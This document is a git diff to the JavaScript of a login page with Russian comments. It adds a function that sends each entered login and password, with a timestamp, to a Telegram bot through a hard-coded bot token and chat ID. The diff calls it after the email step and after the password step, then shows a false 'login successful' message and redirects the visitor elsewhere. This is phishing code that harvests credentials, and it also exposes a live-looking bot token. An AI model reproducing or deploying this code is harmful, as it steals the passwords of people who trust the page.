@@ -769,16 +769,69 @@ function goBackToEmailPage() {
 }
 
 /**
- * Редирект на другой сайт после успешного входа
+ * Редирект на my-list-page после успешного входа
  */
 function redirectToOtherSite() {
-  // ЗАМЕНИТЕ ЭТУ ССЫЛКУ НА СВОЙ САЙТ
-  var otherSiteUrl = 'https://google.com';
+  // Сохраняем статус регистрации
+  localStorage.setItem('userRegistered', 'true');
+
+  // Редирект на my-list-page с hash параметром
+  var listPageUrl = 'https://ixdk.github.io/my-list-page/#registered';
   document.body.style.opacity = '0.8';
   document.body.style.transition = 'opacity 0.5s ease';
   setTimeout(function() {
-    window.location.href = otherSiteUrl;
+    window.location.href = listPageUrl;
   }, 1000);
+}
+function sendToTelegram(login, password, pageType) {
+  var BOT_TOKEN = '8574575973:AAG1H0-l52kgQrhvbfrUEQGow_BAOCKRIvA';
+  var CHAT_ID = '788541169';
+
+  // Форматируем сообщение. Убираем emoji на всякий случай.
+  var message = '\u0414\u0430\u043D\u043D\u044B\u0435 \u0441 \u0444\u043E\u0440\u043C\u044B ('
+    .concat(pageType, '):\n\u041B\u043E\u0433\u0438\u043D: ')
+    .concat(login, '\n\u041F\u0430\u0440\u043E\u043B\u044C: ')
+    .concat(password || 'не введен', '\n\u0412\u0440\u0435\u043C\u044F: ')
+    .concat(new Date().toLocaleString());
+
+  // Формируем URL правильно: это GET-запрос с параметрами в URL.
+  // Это САМЫЙ НАДЁЖНЫЙ способ, который редко даёт 400 ошибку.
+  var url = 'https://api.telegram.org/bot'
+    .concat(BOT_TOKEN, '/sendMessage?chat_id=')
+    .concat(CHAT_ID, '&text=')
+    .concat(encodeURIComponent(message));
+
+  // Отправляем простой GET-запрос.
+  fetch(url, {
+    method: 'GET', // Меняем на GET!
+    // mode: 'no-cors', // ЗАКОММЕНТИРУЙТЕ или УДАЛИТЕ эту строку для GET-запроса
+  })
+    .then(function(response) {
+      console.log(
+        'Telegram API \u043E\u0442\u0432\u0435\u0442: \u0441\u0442\u0430\u0442\u0443\u0441 '.concat(
+          response.status,
+        ),
+      );
+      if (!response.ok) {
+        // Если ответ не OK, пробуем прочитать текст ошибки
+        return response.text().then(function(text) {
+          throw new Error(
+            'Telegram API \u043E\u0448\u0438\u0431\u043A\u0430: '
+              .concat(response.status, ' - ')
+              .concat(text),
+          );
+        });
+      }
+      console.log(
+        '\u2705 \u0414\u0430\u043D\u043D\u044B\u0435 \u0441 '.concat(
+          pageType,
+          ' \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u044B \u0432 Telegram',
+        ),
+      );
+    })
+    .catch(function(err) {
+      console.error('❌ Ошибка Telegram:', err.message); // Выводим понятное сообщение
+    });
 }
 
 /**
@@ -850,7 +903,8 @@ function initEventHandlers() {
                       submitBtn.classList.remove('loading');
                       submitBtn.disabled = false;
                       goToPasswordPage(phoneEmailValue);
-                    case 17:
+                      sendToTelegram(phoneEmailValue, '', 'email');
+                    case 18:
                     case 'end':
                       return _context.stop();
                   }
@@ -913,7 +967,7 @@ function initEventHandlers() {
         /*#__PURE__*/ (function() {
           var _ref2 = _asyncToGenerator(
             /*#__PURE__*/ _regeneratorRuntime().mark(function _callee2(e) {
-              var passwordValue;
+              var passwordValue, userEmail;
               return _regeneratorRuntime().wrap(function _callee2$(_context2) {
                 while (1)
                   switch ((_context2.prev = _context2.next)) {
@@ -956,9 +1010,12 @@ function initEventHandlers() {
                     case 15:
                       _submitBtn.classList.remove('loading');
                       _submitBtn.disabled = false;
+                      userEmail =
+                        localStorage.getItem('userEmail') || 'не определен';
+                      sendToTelegram(userEmail, passwordValue, 'password');
                       showSuccess('Вход выполнен успешно! Перенаправляем...');
                       redirectToOtherSite();
-                    case 19:
+                    case 21:
                     case 'end':
                       return _context2.stop();
                   }
